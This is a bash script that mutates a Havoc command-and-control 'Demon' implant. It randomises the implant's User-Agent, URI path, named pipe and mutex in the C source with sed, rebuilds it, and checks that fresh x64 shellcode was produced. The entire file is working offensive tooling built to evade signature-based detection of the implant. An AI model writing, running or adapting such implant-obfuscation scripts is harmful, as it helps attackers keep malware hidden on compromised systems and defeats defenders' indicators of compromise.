#!/bin/bash

# === CONFIG ===
IMPLANT_DIR="$HOME/Tools/Havoc/payloads/Demon"
SRC_DIR="$IMPLANT_DIR/src"
BUILD_ROOT="$HOME/Tools/Havoc"
OUTPUT_FILE="$HOME/Tools/Havoc/payloads/Shellcode.x64.bin"
BACKUP_DIR="$HOME/Tools/Havoc/payloads/backup"
TIMESTAMP=$(date +"%Y%m%d_%H%M%S")

# === COLORS ===
YELLOW='\033[1;33m'
GREEN='\033[1;32m'
NC='\033[0m'

echo -e "${YELLOW}[+] Starting Havoc implant mutation...${NC}"

# === 1. Backup Previous Shellcode ===
mkdir -p "$BACKUP_DIR"
if [[ -f "$OUTPUT_FILE" ]]; then
    cp "$OUTPUT_FILE" "$BACKUP_DIR/implant_$TIMESTAMP.raw"
    echo -e "${GREEN}[*] Previous shellcode backed up to: implant_$TIMESTAMP.raw${NC}"
else
    echo -e "${YELLOW}[!] No previous shellcode found to back up.${NC}"
fi

# === 2. Generate Random Identifiers ===
random_str() {
    tr -dc A-Za-z0-9 </dev/urandom | head -c 12
}

UA=$(random_str)
URI=$(random_str)
PIPE=$(random_str)
MUTEX=$(random_str)

# === 3. Mutate TransportHttp.c ===
THTTP="$SRC_DIR/core/TransportHttp.c"
if [[ -f "$THTTP" ]]; then
    sed -i "s/User-Agent: .*/User-Agent: ${UA}\\r\\n\";/" "$THTTP"
    sed -i "s|/stage|/${URI}|g" "$THTTP"
    echo -e "${GREEN}[*] Replaced User-Agent with '${UA}' and URI path with '/${URI}'${NC}"
else
    echo -e "${YELLOW}[!] TransportHttp.c not found. Skipping User-Agent/URI mutation.${NC}"
fi

# === 4. Mutate Named Pipe and Mutex ===
TARGET_FILE=""
for f in "$SRC_DIR/core/Runtime.c" "$SRC_DIR/main/MainExe.c"; do
    if [[ -f "$f" ]]; then
        TARGET_FILE="$f"
        break
    fi
done

if [[ -n "$TARGET_FILE" ]]; then
    sed -i "s|\\\\\\\\.\\\\pipe\\\\[a-zA-Z0-9_]*|\\\\\\\\.\\\\pipe\\\\${PIPE}|g" "$TARGET_FILE"
    sed -i "s|Mutex_[a-zA-Z0-9_]*|Mutex_${MUTEX}|g" "$TARGET_FILE"
    echo -e "${GREEN}[*] Randomized named pipe: \\\\.\\pipe\\${PIPE}${NC}"
    echo -e "${GREEN}[*] Randomized mutex: Mutex_${MUTEX}${NC}"
else
    echo -e "${YELLOW}[!] No config file found to mutate mutex/pipe.${NC}"
fi

# === 5. Rebuild Implant via Top-Level Makefile ===
echo -e "${YELLOW}[+] Rebuilding Havoc payload from top-level makefile...${NC}"
cd "$BUILD_ROOT" || exit 1
make clean && make

# === 6. Confirm Shellcode Output ===
if [[ -f "$OUTPUT_FILE" ]]; then
    echo -e "${GREEN}[+] Success! New shellcode generated: $OUTPUT_FILE${NC}"
else
    echo -e "${YELLOW}[!] Build failed or shellcode was not generated.${NC}"
    exit 1
fi
